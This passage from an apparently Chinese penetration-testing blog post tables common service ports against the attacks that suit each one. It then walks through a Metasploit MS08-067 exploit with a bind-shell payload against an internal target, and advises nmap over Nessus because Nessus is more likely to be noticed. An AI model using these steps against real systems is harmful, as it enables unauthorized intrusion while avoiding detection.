<td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                139<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                samba<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\未授权访问\远程代码执行<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                143<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                imap<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                161<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                snmp<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                389<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                ldap<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                注入攻击\未授权访问<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                512/513/514<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                linux r<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                直接使用rlogin<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                873<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                rsync<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                未授权访问<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                1080<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                socket<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：进行内网渗透<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                1352<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                lotus<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：弱口令\信息泄漏：源代码<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                1433<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                mssql<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：使用系统用户登录\注入攻击<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                1521<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                oracle<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：TNS\注入攻击<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                2049<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                nfs<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                配置不当<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                2181<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                zookeeper<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                未授权访问<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                3306<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                mysql<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\拒绝服务\注入<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                3389<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                rdp<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\Shift后门<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                4848<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                glassfish<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：控制台弱口令\认证绕过<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                5000<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                sybase/DB2<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\注入<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                5432<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                postgresql<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                缓冲区溢出\注入攻击\爆破：弱口令<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                5632<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                pcanywhere<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                拒绝服务\代码执行<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                5900<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                vnc<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：弱口令\认证绕过<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                6379<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                redis<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                未授权访问\爆破：弱口令<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                7001<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                weblogic<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                Java反序列化\控制台弱口令\控制台部署webshell<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                80/443/8080<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                web<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                常见web攻击\控制台爆破\对应服务器版本漏洞<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                8069<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                zabbix<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                远程命令执行<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                9090<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                websphere控制台<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破：控制台弱口令\Java反序列<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                9200/9300<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                elasticsearch<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                远程代码执行<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                11211<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                memcacache<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                未授权访问<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                27017<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                mongodb<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\未授权访问<br>            </td><br>        </tr><br>    </tbody><br></table>
+
+<pre><code>&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;转网络&lt;/span&gt;
+</code></pre><p>#<br>    6.溢出</p>
+<pre><code>当通过VPN进入内网web搞不定，可以试试系统漏洞，内网补丁很少的情况下可以试试远程溢出。
+
+&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;推荐2个exp网站：&lt;/span&gt;
+
+&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;https://www.exploit-db.com/&lt;/span&gt;
+</code></pre><p><span style="box-sizing:border-box;color:#FF0000;"><a href="https://www.kernel-exploits.com/" target="_blank" rel="noopener">https://www.kernel-exploits.com/</a></span></p>
+<p>扫描漏洞我们可以通过nmap或者Nessus扫描内网漏洞，推荐使用nmap，Nessus扫描动静太大容易发现。</p>
+<pre><code>&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;案例：仅供参考（ps:这个是好久以前搞的一台内网）&lt;/span&gt;
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/3c2a2c92f4879f921d210f9792ec0c7f20170421081815.png)
+
+使用Metasploit
+
+use exploit/windows/smb/ms08_067_netapi &amp;nbsp;加载漏洞模块
+
+set LHOST&amp;nbsp; 本机IP
+
+set RHOST&amp;nbsp;&amp;nbsp; 目标ip
+
+set payload windows/shell_bind_tcp&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; payload
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/6b56222a08e0bc662b6498c672ec21e720170421081822.png)
+
+&lt;span style=&quot;box-sizing:border-box;color:#000000;&quot;&gt;show options&amp;nbsp;&amp;nbsp;看看有没有什么设置错误的地方。&lt;/span&gt;
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/6c31608b263d7497776fe4bbe35b544420170421081827.png)
+
+Exploit&amp;nbsp;&amp;nbsp; 攻击
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/52e7e23a38e757c4d97b6936faa54fb120170421081832.png)
+</code></pre><p><span style="box-sizing:border-box;color:#555555;font-family:'Microsoft Yahei';font-size:15px;line-height:25px;white-space:normal;display:block;padding-top:40px;background-color:#FFFFFF;"></span></p>
